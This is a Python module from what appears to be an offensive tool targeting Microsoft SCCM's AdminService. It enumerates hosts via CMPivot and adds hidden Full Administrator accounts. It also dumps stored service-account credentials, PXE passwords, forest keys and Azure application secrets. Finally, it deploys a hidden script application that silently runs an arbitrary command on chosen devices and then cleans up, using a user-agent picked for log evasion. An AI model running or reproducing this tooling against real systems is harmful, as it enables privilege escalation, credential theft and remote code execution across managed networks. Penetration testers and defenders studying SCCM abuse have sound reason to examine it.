import base64
import binascii
import codecs
import hashlib
import json
import math
import os
import sqlite3
import time
import uuid
import xml.etree.ElementTree as ET

import pandas as dp
import requests
from Crypto.Cipher import AES, DES3
from datetime import datetime
from hashlib import sha1
from requests_ntlm import HttpNtlmAuth
from tabulate import tabulate
from urllib3.exceptions import InsecureRequestWarning

from lib.logger import logger
from lib.ldap import ldap3_kerberos_login


# Disable SSL warnings once at module level
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


class AdminServiceClient:
    """Base class for making HTTP requests to SCCM AdminService"""

    def __init__(self, username, password, target, kerberos, domain, kdcHost, logs_dir=None):
        self.username = username
        self.password = password
        self.target = target
        self.kerberos = kerberos
        self.domain = domain
        self.dc = kdcHost
        self.logs_dir = logs_dir
        #the user-agent was stolen from the AdminService log file and showed up repeatedly, seems like the best one to show up in the logs for evasion
        self.headers = {'Content-Type': 'application/json; odata=verbose', 'User-Agent': 'Device action simulation'}

    def _make_request(self, method, url, json_data=None, headers=None):
        try:
            if self.kerberos:
                token = ldap3_kerberos_login(
                    connection=None,
                    target=self.target,  # Extract hostname
                    user=self.username,
                    password=self.password,
                    domain=self.domain,
                    kdcHost=self.dc,
                    admin_service=True
                )
                headers = {'Content-Type': 'application/json; odata=verbose',
                        'User-Agent': 'Device action simulation',
                        'Authorization': token}
                
                r = requests.request(method=method,
                                    url=url,
                                    verify=False,
                                    headers=headers,
                                    json=json_data)  
                
            else:
                r = requests.request(
                    method=method,
                    url=url,
                    auth=HttpNtlmAuth(self.username, self.password),
                    verify=False,
                    headers=self.headers,
                    json=json_data
                )
            return r
        except Exception as e:
            logger.error(f"Request failed: {e}")
            raise

    def http_get(self, url, headers=None):
        """Make a GET request"""
        return self._make_request("GET", url, headers=headers)

    def http_post(self, url, json_data=None, headers=None):
        """Make a POST request"""
        return self._make_request("POST", url, json_data=json_data, headers=headers)

    def http_delete(self, url, headers=None):
        """Make a DELETE request"""
        return self._make_request("DELETE", url, headers=headers)

    def http_patch(self, url, json_data=None, headers=None):
        """Make a PATCH request"""
        return self._make_request("PATCH", url, json_data=json_data, headers=headers)

    def jprint(self, obj):
        """Pretty print JSON objects"""
        text = json.dumps(obj, sort_keys=True, indent=4)
        return text


class CMPIVOT(AdminServiceClient):

    def __init__(self, username, password, target,  kerberos, domain, kdcHost, logs_dir):
        super().__init__(username, password, target,  kerberos, domain, kdcHost, logs_dir)
        self.opid = ""
        self.body = ""
        self.device = ""
        self.endpoint = ""
    
    def administrators(self, device):
        body = {"InputQuery":"Administrators"}
        self.device = device
        self.do_request(body)
    
    def computer_system(self):
        return
    
    def connection(self):
        return
    
    def desktop(self):
        return
    
    def user(self, device):
        self.device=device
        body = {"InputQuery":"User"}
        self.do_request(body)
    
    def os(self, device):
        self.device = device
        body = {"InputQuery":"OS"}
        self.do_request(body)

    def file(self, arg, device):
        query = {"InputQuery": ""}
        path = "File('" + arg + "') | distinct FileName, Mode, LastWriteTime, Size, Device" 
        query["InputQuery"] = path
        self.device = device
        print(query)
        self.do_request(query)
        return

    
    # this function doesn't work no matter how hard I try
    # used a script instead open a PR please!!
    def file_content(self, arg, device):
        self.device = device
        query = {"InputQuery": ""}
        path = f"FileContent('{arg}')"
        query["InputQuery"] = path
        print(query)
        self.do_request(query)
        return
    
    def file_share(self, device):
        self.device = device
        body = {"InputQuery":"FileShare"}
        self.do_request(body)
        return
    
    def installed_exe(self):
        body = {"InputQuery":"InstalledExecutable"}
        self.do_request(body)
        return
    
    def installed_software(self, device):
        self.device=device
        body = {"InputQuery":"InstalledSoftware | distinct ProductName, Publisher, ProductVersion"}
        self.do_request(body)
        return
    
    def ipconfig(self, device):
        self.device = device
        body = {"InputQuery":"IPConfig"}
        self.do_request(body)
        return
    
    def logical_disk(self, device):
        self.device = device
        body = {"InputQuery":"LogicalDisk | distinct Device, Description, Caption, DeviceID"}
        self.do_request(body)
        return
    
    def process(self, device):
        body = {"InputQuery":"Process"}
        self.device = device
        self.do_request(body)
        return
        
    def services(self, device):
        self.device = device
        body = {"InputQuery":"Services | distinct Device, Name, PathName, ProcessId, ServiceType, Started"}
        self.do_request(body)
        return
    
    def system_console_user(self, device):
        body = {"InputQuery":"SystemConsoleUser"}
        self.device = device
        self.do_request(body)
        return

    def environment(self, device):
        self.device = device
        body = {"InputQuery":"Environment"}
        self.do_request(body)
        return
        
    def osinfo(self, device):
        self.device = device
        body = {"InputQuery":"OS | distinct Caption, Version, OSArchitecture, Device"}
        self.do_request(body)
        return

    def disk(self, device):
        self.device = device
        body = {"InputQuery":"Disk"}
        self.do_request(body)
        return
    
    def sessionhunter(self, device, user):
        self.device = device
        body = {"InputQuery":f"User| where UserName contains '{user}'"}
        self.do_request(body)
    ### Not implemented yet

        
    def registry(self):
        return
    
    def registry_key(self):
        return

    def do_request(self, body):

        if self.device[0].isdigit():
            self.endpoint = "Device"
        if self.device[0].isalpha():
            self.endpoint = "Collections"
            self.device = f"'{self.device}'"

        endpoint = f"https://{self.target}/AdminService/v1.0/{self.endpoint}({self.device})/AdminService.RunCMPivot"
        try:
            r = self.http_post(endpoint, json_data=body)
            print(body)
            if r.status_code == 200:
                js0n = r.json()
                if self.endpoint == "Collections":
                    self.opid=(js0n['OperationId'])
                    logger.debug("Querying Collections")
                elif self.endpoint == "Device":
                    logger.debug("Querying Devices")
                    self.opid = (js0n['value']['OperationId'])
                logger.info(f"Got OperationId {self.opid}. Sleeping 10 seconds to wait for host to call home.")
                time.sleep(10)
                self.get_results()                    
            else:
                logger.info("Something went wrong.")
                logger.info(r.status_code)
                logger.info(r.text) 
        except Exception as e:
            logger.info(f"An error occurred: {e}")

    

    def get_results(self):
        endpoint = f"https://{self.target}/AdminService/v1.0/{self.endpoint}({self.device})/AdminService.CMPivotResult(OperationId={self.opid})"
        while True:
            try:
                r = self.http_get(endpoint)
                if r.status_code == 404:
                    logger.info("No results yet, sleeping 10 seconds.")
                    time.sleep(10)
                    continue
                data = r.json()
                if isinstance(data['value'], list):
                    for entry in data['value']:
                        tb = dp.DataFrame(entry['Result'])
                        result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                        logger.info(result)
                        self.printlog(result)
                else:
                    tb = dp.DataFrame(data['value']['Result'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    self.printlog(result)
                return
            except Exception as e:
                logger.info(e)
                return

    def jprint(self, data):
        try:
            text = json.dumps(data, sort_keys=True, indent=4)
            logger.info(text)
        except ValueError:
            return
        

    def printlog(self, result):
        filename = (f'{self.logs_dir}/console.log')
        dt = datetime.now()
        ts = str(dt)
        with open(filename, 'a') as f:
            f.write("\n--------"+ ts + "--------\n")
            f.write("\n{}\n".format(result))
            f.close


class ADD_ADMIN(AdminServiceClient):
    def __init__(self, username, password, target_ip,  kerberos, domain, kdcHost, logs_dir):
        super().__init__(username, password, target_ip,  kerberos, domain, kdcHost, logs_dir)
        self.target_ip = target_ip
        #logger.debug(text)


    def add(self, targetuser, targetsid):
        self.targetuser = targetuser
        self.targetsid = targetsid

        body = {"LogonName": f"{self.targetuser}", 
            "AdminSid":f"{self.targetsid}",
            "Permissions":[{"CategoryID": "SMS00ALL", 
                            "CategoryTypeID": 29, 
                            "RoleID":"SMS0001R",
                            },
                            {"CategoryID": "SMS00001",
                            "CategoryTypeID": 1, 
                            "RoleID":"SMS0001R", 
                            },
                            {"CategoryID": "SMS00004", 
                            "CategoryTypeID": 1, 
                            "RoleID":"SMS0001R",
                            }],
            "DisplayName":f"{self.targetuser}"
            }
        
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin/"

        try:
            r = self.http_post(url, json_data=body)
            if r.status_code == 201:
                logger.info(f"[+] Successfully added {self.targetuser} as an admin.")
                results = self.jprint(r.json())
                logger.debug(results)
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
        except Exception as e:
                print(e)


    def delete(self, targetuser):
        self.targetuser = targetuser
        try:
            adminid = self.get_adminid()
            if adminid:
                url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin({adminid})"
                r = self.http_delete(url)
                if r.status_code == 204:
                    logger.info(f"[+] Successfully removed {self.targetuser} as an admin.")
                else:
                    logger.info("[-] Something went wrong:")
                    logger.info(r.text)
            else:
                 return
        except Exception as e:
                print(e)


    def get_adminid(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin/?$filter=LogonName eq '{self.targetuser}'"
        try:
            r = self.http_get(url)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if len(data['value']) == 0:
                         logger.info(f"Target user {self.targetuser} is not configured as an SMS Admin")
                    else:
                        adminid = data['value'][0]['AdminID']
                        logger.debug(f"[+] Got AdminID: {adminid}")
                        return adminid
                except:
                    logger.info("Something went wrong")
                    logger.info(r.text)
                    logger.info(r.status_code)
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)
        
    def show_admins(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin?$filter=RoleNames/any(role: role eq 'Full Administrator')&$select=LogonName"
        try:
            r = self.http_get(url)
            if r.status_code == 200:
                data = r.json()
                if data:
                    logger.info("Current Full Admin Users:")
                    admins = data['value']
                    for i in admins:
                         logger.info(i['LogonName'])
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)  
        

    def show_rbac(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin?$select=LogonName,RoleNames"
        try:
            r = self.http_get(url)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data['value'], list):
                    tb = dp.DataFrame(data['value'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    #self.printlog(result)
                else:
                    tb = dp.DataFrame(data['value']['Result'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    #self.printlog(result)
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)  
        
    def show_consoleconnections(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_ConsoleAdminsData?$select=UserName,MachineName,Source,ConsoleVersion"
        try:
            r = self.http_get(url)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data['value'], list):
                    tb = dp.DataFrame(data['value'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    #self.printlog(result)
                else:
                    tb = dp.DataFrame(data['value']['Result'])
                    result = tabulate(tb, showindex=False, headers=tb.columns, tablefmt='grid')
                    logger.info(result)
                    #self.printlog(result)
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)  

    def get_creds(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_Reserved?$select=UserName,Reserved2,AccountUsage"
        try:
            r = self.http_get(url)
            if r.status_code == 200:
                data = r.json()
                print(self.jprint(data))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e) 
    

    def get_pxepass(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_SCProperty?$filter=PropertyName eq 'PXEPassword'&$select=PropertyName,Value1"
        try:
            r = self.http_get(url)
            if r.status_code == 200:
                data = r.json()
                print((self.jprint(data)))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)

    def get_forestkey(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_SCProperty?$filter=startswith(PropertyName, 'GlobalAccount')&$select=Value1,Value2"
        try:
            r = self.http_get(url)
            if r.status_code == 200:
                data = r.json()
                print((self.jprint(data)))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)
         

    def get_azurecreds(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_AAD_Application_Ex?$select=ClientID,SecretKey"
        try:
            r = self.http_get(url)
            if r.status_code == 200:
                data = r.json()
                print((self.jprint(data)))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)

    def get_azuretenant(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_AAD_Tenant_Ex?$select=Name,TenantID"
        try:
            r = self.http_get(url)
            if r.status_code == 200:
                data = r.json()
                print((self.jprint(data)))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)
                
    def get_sccmversion(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Identification.GetProviderVersion"
        try:
            r = self.http_get(url)
            if r.status_code == 201:
                data = r.json()
                print((self.jprint(data)))
                return
            else:
                logger.info("[*] Something went wrong")
                logger.info(r.text)
                logger.info(r.status_code)
        except Exception as e:
                print(e)


    def get_consoleinstaller(self):
        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Identification.GetFileBinary"
        
        block_number = 1
        binary_chunks = []
        
        while True:
            body = {
                "blockNumber": block_number,
                "FileName": "adminconsole.msi"
            }
            
            try:
                r = self.http_post(url, json_data=body)
                r.raise_for_status()
                
                data = r.json()
                
                b64_chunk = data.get('binary64Encoded', '').replace('\r\n', '')
                binary_chunk = base64.b64decode(b64_chunk)
                binary_chunks.append(binary_chunk)
                
                print(f"[+] Block {block_number}: {len(binary_chunk)} bytes")
                
                if data.get('isTheLastBlock', False):
                    break
                
                block_number += 1
                
            except Exception as e:
                print(f"[-] Error on block {block_number}: {e}")
                return None
        

        binary_data =  b''.join(binary_chunks)
        if binary_data:
            with open("adminconsole.msi", 'wb') as f:
                f.write(binary_data)
            print(f"[+] Saved {len(binary_data)} bytes to adminconsole.msi")
            
#everything here was converted from SharpSCCM...ily @_Mayyhem
class SMSAPPLICATION(AdminServiceClient):

    def __init__(self, username, password, target,  kerberos, domain, kdcHost, logs_dir):
        super().__init__(username, password, target,  kerberos, domain, kdcHost, logs_dir)
        # Use base class headers (inherits from AdminServiceClient)

        #created during execution
        self.site_ID = ""
        self.scope_ID = ""
        self.app_ID = ""
        self.app_CI_ID = ""
        self.deployment_ID = ""
        self.assignment_id = ""
        self.file_ID = ""
        self.collection_name = ""
        self.collection_id = ""
        self.resource_name = ""
        self.site_code = ""
        self.deployment_name = ""


        #user controlled input
        self.runas_user = ""
        self.path = ""
        self.working_dir = ""
        self.app_name = ""
        self.collection_type = ""
        self.target_resource = ""
        self.class_name = ""

    # Alias methods for backward compatibility with existing code
    def adminservice_post(self, url, body):
        return self.http_post(url, json_data=body)

    def adminservice_get(self, url):
        return self.http_get(url)

    def adminservice_delete(self, url):
        return self.http_delete(url)

    def adminservice_patch(self, url, body):
        return self.http_patch(url, json_data=body)

    def get_sitecode(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_Site"
        r = self.adminservice_get(url)
        
        if r.status_code == 200:
            response = r.json()
            self.site_code = response['value'][0]['SiteCode']
            return
        else:
            logger.info("[-] Couldn't recover the SiteCode")
            return
        
    def application_xml(self):
        self.app_ID = f"Application_{uuid.uuid4()}"
        self.deployment_ID = f"DeploymentType_{uuid.uuid4()}"
        self.file_ID = f"File_{uuid.uuid4()}"
        logger.info(f"[*] Creating new application: {self.app_ID}")
        logger.info(f"[*] Application path: {self.path}")
        logger.info(f"[*] Updated application to run in the context of {self.runas_user}")
        
        
        xml = f'''<?xml version="1.0" encoding="utf-16"?>
                <AppMgmtDigest xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                    <Application AuthoringScopeId="{self.scope_ID}" LogicalName="{self.app_ID}" Version="1">
                        <DisplayInfo DefaultLanguage="en-US">
                            <Info Language="en-US">
                                <Title>{self.app_name}</Title>
                                <Publisher/>
                                <Version/>
                            </Info>
                        </DisplayInfo>
                        <DeploymentTypes>
                            <DeploymentType AuthoringScopeId="{self.scope_ID}" LogicalName="{self.deployment_ID}" Version="1"/>
                        </DeploymentTypes>
                        <Title ResourceId="Res_665624387">{self.app_name}</Title>
                        <Description ResourceId="Res_215018014"/>
                        <Publisher ResourceId="Res_433133800"/>
                        <SoftwareVersion ResourceId="Res_486536226"/>
                        <CustomId ResourceId="Res_167409166"/>
                    </Application>
                    <DeploymentType AuthoringScopeId="{self.scope_ID}" LogicalName="{self.deployment_ID}" Version="1">
                        <Title ResourceId="Res_1643586251">{self.app_name}</Title>
                        <Description ResourceId="Res_1438196005"/>
                        <DeploymentTechnology>GLOBAL/ScriptDeploymentTechnology</DeploymentTechnology>
                        <Technology>Script</Technology>
                        <Hosting>Native</Hosting>
                        <Installer Technology="Script">
                            <ExecutionContext>{self.runas_user}</ExecutionContext>
                            <DetectAction>
                                <Provider>Local</Provider>
                                <Args>
                                    <Arg Name="ExecutionContext" Type="String">{self.runas_user}</Arg>
                                    <Arg Name="MethodBody" Type="String">
                                        &lt;?xml version="1.0" encoding="utf-16"?&gt;                                                                                       
                                            &lt;EnhancedDetectionMethod xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;
                                                &lt;Settings xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;
                                                    &lt;File Is64Bit="true" LogicalName="{self.file_ID}" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration"&gt;
                                                        &lt;Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;
                                                            &lt;DisplayName Text="" /&gt;
                                                            &lt;Description Text="" /&gt;
                                                        &lt;/Annotation&gt;
                                                        &lt;Path&gt;C:\\&lt;/Path&gt;
                                                        &lt;Filter&gt;asdf&lt;/Filter&gt;
                                                    &lt;/File&gt;
                                                &lt;/Settings&gt;
                                                &lt;Rule id="{self.scope_ID}/{self.deployment_ID}" Severity="Informational" NonCompliantWhenSettingIsNotFound="false" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;
                                                    &lt;Annotation&gt;
                                                        &lt;DisplayName Text="" /&gt;
                                                        &lt;Description Text="" /&gt;
                                                    &lt;/Annotation&gt;
                                                    &lt;Expression&gt;
                                                        &lt;Operator&gt;NotEquals&lt;/Operator&gt;
                                                        &lt;Operands&gt;
                                                            &lt;SettingReference AuthoringScopeId="{self.scope_ID}" LogicalName="{self.app_ID}" Version="1" DataType="Int64" SettingLogicalName="{self.file_ID}" SettingSourceType="File" Method="Count" Changeable="false" /&gt;
                                                            &lt;ConstantValue Value="0" DataType="Int64" /&gt;
                                                        &lt;/Operands&gt;
                                                    &lt;/Expression&gt;
                                                &lt;/Rule&gt;
                                            &lt;/EnhancedDetectionMethod&gt;
                                    </Arg>
                                </Args>
                            </DetectAction>
                            <InstallAction>
                                <Provider>Script</Provider>
                                <Args>
                                    <Arg Name="InstallCommandLine" Type="String">{self.path}</Arg>
                                    <Arg Name="WorkingDirectory" Type="String">{self.working_dir}</Arg>
                                    <Arg Name="ExecutionContext" Type="String">{self.runas_user}</Arg>
                                    <Arg Name="RequiresLogOn" Type="String"/>
                                    <Arg Name="RequiresElevatedRights" Type="Boolean">false</Arg>
                                    <Arg Name="RequiresUserInteraction" Type="Boolean">false</Arg>
                                    <Arg Name="RequiresReboot" Type="Boolean">false</Arg>
                                    <Arg Name="UserInteractionMode" Type="String">Hidden</Arg>
                                    <Arg Name="PostInstallBehavior" Type="String">BasedOnExitCode</Arg>
                                    <Arg Name="ExecuteTime" Type="Int32">0</Arg><Arg Name="MaxExecuteTime" Type="Int32">15</Arg>
                                    <Arg Name="RunAs32Bit" Type="Boolean">false</Arg>
                                    <Arg Name="SuccessExitCodes" Type="Int32[]">
                                        <Item>0</Item>
                                        <Item>1707</Item>
                                    </Arg>
                                    <Arg Name="RebootExitCodes" Type="Int32[]">
                                        <Item>3010</Item>
                                    </Arg>
                                    <Arg Name="HardRebootExitCodes" Type="Int32[]">
                                        <Item>1641</Item>
                                    </Arg>
                                    <Arg Name="FastRetryExitCodes" Type="Int32[]">
                                        <Item>1618</Item>
                                    </Arg>
                                </Args>
                            </InstallAction>
                            <CustomData>
                                <DetectionMethod>Enhanced</DetectionMethod>
                                <EnhancedDetectionMethod>
                                    <Settings xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest">
                                        <File xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration" Is64Bit="true" LogicalName="{self.file_ID}">
                                            <Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules">
                                                <DisplayName Text=""/>
                                                <Description Text=""/>
                                            </Annotation>
                                            <Path>C:\\</Path>
                                            <Filter>asdf</Filter>
                                        </File>
                                    </Settings>
                                    <Rule xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules" id="{self.scope_ID}/{self.deployment_ID}" Severity="Informational" NonCompliantWhenSettingIsNotFound="false">
                                        <Annotation>
                                            <DisplayName Text=""/><Description Text=""/>
                                        </Annotation>
                                        <Expression>
                                            <Operator>NotEquals</Operator>
                                            <Operands>
                                                <SettingReference AuthoringScopeId="{self.scope_ID}" LogicalName="{self.app_ID}" Version="1" DataType="Int64" SettingLogicalName="{self.file_ID}" SettingSourceType="File" Method="Count" Changeable="false"/>
                                                <ConstantValue Value="0" DataType="Int64"/>
                                            </Operands>
                                        </Expression>
                                    </Rule>
                                </EnhancedDetectionMethod>
                                <InstallCommandLine>{self.path}</InstallCommandLine>
                                <UninstallSetting>SameAsInstall</UninstallSetting>
                                <InstallFolder/>
                                <UninstallCommandLine/>
                                <UninstallFolder/>
                                <MaxExecuteTime>15</MaxExecuteTime>
                                <ExitCodes>
                                    <ExitCode Code="0" Class="Success"/>
                                    <ExitCode Code="1707" Class="Success"/>
                                    <ExitCode Code="3010" Class="SoftReboot"/>
                                    <ExitCode Code="1641" Class="HardReboot"/>
                                    <ExitCode Code="1618" Class="FastRetry"/>
                                </ExitCodes>
                                <UserInteractionMode>Hidden</UserInteractionMode>
                                <AllowUninstall>true</AllowUninstall>
                            </CustomData>
                        </Installer>
                    </DeploymentType>
                </AppMgmtDigest>
                '''
        return xml
        
    def get_siteid(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_Identification.GetSiteID"
        try:
            r = self.adminservice_get(url)
            if r.status_code == 201:
                result=r.json()
                site_ID = result.get("SiteID", "")
                self.site_ID = site_ID.replace("{", "").replace("}", "")
                self.scope_ID = f"ScopeId_{self.site_ID}"
            else:
                logger.info("[-] Something went wrong when requesting the site ID.")
                logger.info(r.status_code)
                logger.info(r.content)
        except Exception as e:
            logger.info(e)
            
            
    def add_application(self, xml):

        url = f"https://{self.target}/AdminService/wmi/SMS_Application"

        body = {"SDMPackageXML": xml,
                "IsHidden": True
        }
        
        r = self.adminservice_post(url, body)   
        if r.status_code == 201:
            logger.info(f"[*] Successfully created application")
            response = r.json()
            self.app_CI_ID = response.get("CI_ID")
            return True
        else:
            return False
        
    def check_if_application_exists(self):
        logger.info("[*] Checking if application already exists")
        url = f"https://{self.target}/AdminService/wmi/SMS_Application?$filter=LocalizedDisplayName eq '{self.app_name}'"
        r = self.adminservice_get(url)
    
    def new_application(self):
        is_name_used = self.check_if_application_exists()   
        if is_name_used:
            logger.info("[-] Application is already in use. Try a different name")
            return False

        self.get_siteid()
       
        if not self.scope_ID:
            return False
        
        xml = self.application_xml()

        if not xml:
            return False

        return self.add_application(xml)


    def new_collection(self):
        if not self.validate_resource_id():
            return False
        if not self.add_collection():
            return False
        if not self.add_collection_member():
            return False
        if not self.validated_collection_membership():
            return False
        return True
    
    
    def add_collection(self):
        if self.collection_type == "device":
            collection_type = 2
            limit_collection = "SMS00001"
        else:
            collection_type = 1
            limit_collection = "SMS00002"
        
        self.collection_name = f"{self.collection_type}_{uuid.uuid4()}"
        logger.info(f"[*] Creating new {self.collection_type} collection: {self.collection_name}")
        
        url = f"https://{self.target}/AdminService/wmi/SMS_Collection"
        
        body = {
            "Name": self.collection_name,
            "LimitToCollectionID": limit_collection,
            "Comment": "",
            "CollectionType": collection_type
        }
        
        r = self.adminservice_post(url, body)
        if r.status_code == 201:
            logger.info("[+] Successfully created collection")
            response = r.json()
            self.collection_id = response.get("CollectionID")
            return True
    

    def add_collection_member(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_Collection('{self.collection_id}')/AdminService.AddMembershipRule"
        
        body = {
        "collectionRule": {
            "@odata.type": "#AdminService.SMS_CollectionRuleDirect",
            "ResourceClassName": self.class_name,
            "RuleName": f"{self.collection_type}_{uuid.uuid4()}",
            "ResourceID": int(self.target_resource)
            }
        }
        r = self.adminservice_post(url, body)
        
        if r.status_code == 201:
            logger.info(f"[+] Added {self.resource_name} {self.target_resource} to {self.collection_name}")
            return True
        else:
            return False
        
    def validated_collection_membership(self):
        logger.info("[*] Waiting for new collection member to become available")
        time.sleep(5)
        
        url = f"https://{self.target}/AdminService/wmi/SMS_FullCollectionMembership?$filter=CollectionID eq '{self.collection_id}'"
        member_available = False
        while not member_available:
            r = self.adminservice_get(url)

            if r.status_code == 200:
                response = r.json()
                count = len(response.get('value', []))
                if count > 0:
                    member_available = True
                    logger.info(f"[+] Successfully added {self.resource_name} {self.target_resource} to {self.collection_name}")
                    return True
            logger.info("[*] New collection member is not available yet... trying again in 5 seconds")
            time.sleep(5)
    
    def validate_resource_id(self): #make sure the resource the user supplied actually exists
        if self.collection_type == "user":
            class_name = "SMS_R_User"
            url = f"https://{self.target}/AdminService/wmi/SMS_R_User({self.target_resource})"
        else:
            class_name = "SMS_R_System"
            url = f"https://{self.target}/AdminService/wmi/SMS_R_System({self.target_resource})"
        
        r = self.adminservice_get(url)
        if r.status_code == 200:
            self.class_name = class_name
            return True
        elif r.status_code == 404:
            logger.info(f"[-] Resource with ResourceID {self.target_resource}. Check your target resource id argument.")
            return False



    def new_deployment(self):
        logger.info(f"[+] Creating new deployment of {self.app_name} to {self.collection_name} ({self.collection_id})")
        url = f"https://{self.target}/AdminService/wmi/SMS_ApplicationAssignment"
        now = datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
        
        if not self.site_code:
            self.get_sitecode()
        
        self.deployment_name = f"{self.app_name}_{self.collection_id}_Install"

        body = {"ApplicationName": self.app_name,
                "AssignmentName": self.deployment_name,
                "AssignmentAction" : 2,
                "AssignedCIs": [int(self.app_CI_ID)],
                "AssignmentType": 2,
                "CollectionName": self.collection_name,
                "DesiredConfigType": 1,
                "DisableMomAlerts": True,
                "EnforcementDeadline": now,
                "LogComplianceToWinEvent": False,
                "NotifyUser": False,
                "OfferFlags": 1,
                "OfferTypeID": 0,
                "OverrideServiceWindows": True,
                "Priority": 2,
                "RebootOutsideOfServiceWindows": False,
                "SoftDeadlineEnabled": True,
                "SourceSite": self.site_code,
                "StartTime": now,
                "SuppressReboot": 0,
                "TargetCollectionID": self.collection_id,
                "UseGMTTimes": True,
                "UserUIExperience": False,
                "WoLEnabled": False
        }
        
        r = self.adminservice_post(url, body)
        if r.status_code == 201:
            response = r.json()
            self.assignment_id = response.get("AssignmentID")
            logger.info(f"[+] Successfully created deployment of {self.app_name} to {self.collection_name} ({self.collection_id})")
            logger.info(f"[*] New deployment name: {self.deployment_name}")
            return True
            
        else:
            return False
        
    def is_deployment_ready(self):
        logger.info("[*] Waiting for new deployment to become available...")
        url = f"https://{self.target}/AdminService/wmi/SMS_ApplicationAssignment?$filter=AssignmentName eq '{self.deployment_name}'"
        time.sleep(5)
        
        deployment_available = False
        while not deployment_available:
            r = self.adminservice_get(url)

            if r.status_code == 200:
                response = r.json()
                count = len(response.get('value', []))
                if count > 0:
                    deployment_available = True
                    logger.info(f"[+] New deployment is available, waiting 30 seconds for updated policy to become available")
                    time.sleep(30)
                    return True
            logger.info("[*] New deployment is not available yet... trying again in 5 seconds")
            time.sleep(5)

        return
    
    def force_policy_update(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_ClientOperation.InitiateClientOperation"
        logger.info(f"[*] Forcing all members of {self.deployment_name} to retrieve machine policy and execute any new applications available")
        if not self.is_deployment_ready():
            return False
        
        body = {
            "Type": 8,
            "TargetCollectionID":self.collection_id,
        }
        r = self.adminservice_post(url, body)
        if r.status_code == 201:
            logger.info("[+] Waiting 1 minute for execution to complete...")
            time.sleep(60)
            return True
        else:
            return False
        

    
    def cleanup(self):
        logger.info("[*] Cleaning up")
        
        delete_deployment_url = f"https://{self.target}/AdminService/wmi/SMS_ApplicationAssignment/{self.assignment_id}"
        r = self.adminservice_delete(delete_deployment_url)
        if r.status_code == 204:
            logger.info(f"[+] Deleted the {self.deployment_name} deployment")
            time.sleep(5)
        else:
            logger.info(r.status_code)
            logger.info(self.jprint(r.json()))
        
        delete_application_url = f"https://{self.target}/AdminService/wmi/SMS_Application({self.app_CI_ID})"
        expire_application_url = f"{delete_application_url}/AdminService.SetIsExpired"
        body = {
            "Expired": True
        }
        
        retire = self.adminservice_post(expire_application_url, body)
        if retire.status_code == 201:
            r = self.adminservice_delete(delete_application_url)
            if r.status_code == 204:
                logger.info(f"[+] Deleted the {self.app_name} application")
                time.sleep(5)    
            else:
                logger.info(r.status_code)
                logger.info(self.jprint(r.json()))

            
        delete_collection_url =  f"https://{self.target}/AdminService/wmi/SMS_Collection/{self.collection_id})"
        
        r = self.adminservice_delete(delete_collection_url)
        if r.status_code == 204:
            logger.info(f"[+] Deleted the {self.collection_name} collection")
        
        logger.info("[+] Completed execution")
        return
        
